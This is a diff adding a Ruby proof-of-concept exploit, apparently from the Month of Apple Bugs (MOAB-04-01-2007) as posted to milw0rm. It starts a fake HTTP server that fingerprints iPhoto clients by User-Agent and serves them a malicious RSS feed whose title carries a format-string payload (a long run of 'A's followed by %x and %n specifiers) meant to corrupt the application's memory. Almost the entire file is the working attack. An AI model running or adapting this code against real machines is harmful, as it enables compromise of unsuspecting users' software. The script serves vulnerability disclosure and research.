@@ -1,0 +1,45 @@
+#!/usr/bin/ruby
+#
+# (c) 2006 LMH <lmh [at] info-pull.com>
+# bug by Kevin Finisterre <kf_lists [at] digitalmunition.com>
+# proof of concept for MOAB-04-01-2007
+# see http://projects.info-pull.com/moab/MOAB-04-01-2007.rb
+
+require 'socket'
+
+IPHOTO_FEED = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n" +
+              "<rss version=\"2.0\" xmlns:aw=\"http://www.apple.com/ilife/wallpapers\">\r\n" +
+              "<channel>\r\n" +
+              "<title>" + ("A" * 256) + "%x.%n.%n.%n.%n.%n</title>\r\n" +
+              "<item>\r\n" +
+              "<title>In Gruber We Trust</title>\r\n" +
+              "<aw:image>http://www.digitalmunition.com/digital_munitions_detonator.jpg\r\n" +
+              "</aw:image>\r\n" +
+              "</item>\r\n" +
+              "</channel>\r\n" +
+              "</rss>\r\n"
+
+web_port    = (ARGV[0] || 80).to_i
+
+puts "++ Starting fake HTTP server at port #{web_port}."
+web_server  = TCPServer.new(nil, web_port)
+while (session = web_server.accept)
+  user_agent = session.recvfrom(2000)[0].scan(/User-Agent: (.*)/).flatten[0]
+  session.print "HTTP/1.1 200/OK\r\nServer: Unabomber/1.0\r\n"
+  
+  # Check if remote user-agent is iPhoto.
+  if user_agent.scan(/iPhoto/).size < 1
+    puts "-- User connected (#{session.peeraddr[3]}) but not running iPhoto, sending bullshit."
+    session.print "Content-type: text/plain\r\n\r\n"
+    session.print "All your Aunt Sophia are belong to us."
+  else
+    puts "++ iPhoto #{user_agent.scan(/iPhoto\/(.+?) /)[0]} user connected (#{session.peeraddr[3]}), " +
+         "sending payload (#{IPHOTO_FEED.size} bytes)."
+    session.print "Content-type: text/xml\r\n\r\n"
+    session.print IPHOTO_FEED
+  end
+
+  session.close
+end
+
+# milw0rm.com [2007-01-04]
